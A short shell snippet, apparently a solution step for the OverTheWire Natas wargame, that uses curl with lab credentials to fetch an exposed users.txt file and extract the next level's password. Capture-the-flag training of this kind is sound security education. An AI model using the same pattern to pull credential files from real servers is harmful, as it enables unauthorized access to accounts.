```
natas3pass=$(curl -s -u natas2:$natas2pass http://natas2.natas.labs.overthewire.org/files/users.txt | grep natas3 | sed 's/natas3://')
echo $natas3pass
```
